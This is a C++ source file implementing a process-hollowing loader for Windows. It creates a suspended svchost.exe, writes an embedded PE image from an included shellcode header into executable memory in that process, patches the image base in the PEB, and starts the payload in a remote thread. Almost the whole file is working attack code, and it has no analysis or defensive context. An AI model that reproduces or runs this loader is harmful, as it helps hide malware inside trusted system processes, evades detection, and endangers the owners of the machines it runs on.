#include <iostream>
#include <Windows.h>
#include <strsafe.h>

#include "hdr/shellcode.h"

int main() {
	// pointers to important structs
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)rawData;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(rawData + DosHeader->e_lfanew);
	// e_lfanew is the file address of the new exe header

	// process info lets you get useful stuff like the process handle with 0 issues
	PPROCESS_INFORMATION pi = (PPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));
	STARTUPINFO si = { sizeof(si) };

	ULONG retlen;
	PROCESS_BASIC_INFORMATION pbi;
	void* newImgBase;
	DWORD ImgBaseAddress;

	// load ntdll to call NtQueryInformationProcess (better than adding it as depedency for multiple reasons)
	HMODULE ntDll = LoadLibraryA("ntdll.dll");
	NTQUERYINFOPROC NtQueryInformationProcess = (NTQUERYINFOPROC)GetProcAddress(ntDll, "NtQueryInformationProcess");

	// check sig
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 1;
	}

	// create svchost (or any other process) in a suspended state using the CREATE_SUSPENDED flag
	// startup info and process info are passed in
	CreateProcess("C:\\Windows\\System32\\svchost.exe",
		NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED, // le flag
		NULL, NULL, &si, pi);

	// find PBI (process basic info)
	NtQueryInformationProcess(
		pi->hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&retlen
	);

	// allocate memory for the new image base
	newImgBase = VirtualAllocEx(
		pi->hProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	// write headers
	WriteProcessMemory(pi->hProcess, newImgBase, rawData, NtHeader->OptionalHeader.SizeOfHeaders, 0);

	// rewrite sections
	PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER(DWORD(rawData) + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++)
	{
		WriteProcessMemory(pi->hProcess,
			(LPVOID)(DWORD(newImgBase) + SectionHeader->VirtualAddress),
			LPVOID(DWORD(rawData) + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData,
			0);
		SectionHeader++;
	}

	// 0x08 is the offset for img base address
	ImgBaseAddress = (DWORD)pbi.PebBaseAddress + 0x08;
	WriteProcessMemory(pi->hProcess, (LPVOID)ImgBaseAddress, LPVOID(&newImgBase), 4, 0);

	// create a new suspended thread
	HANDLE NewThread = CreateRemoteThread(pi->hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD)(newImgBase)+NtHeader->OptionalHeader.AddressOfEntryPoint),
		NULL,
		CREATE_SUSPENDED,
		NULL);

	// resume the thread we created
	ResumeThread(NewThread);

	// suspend the original thread
	SuspendThread(pi->hThread);

	// free the ntDll library as its no longer needed but we're exitting anyway so its whatever
	FreeLibrary(ntDll);
	return 0;
}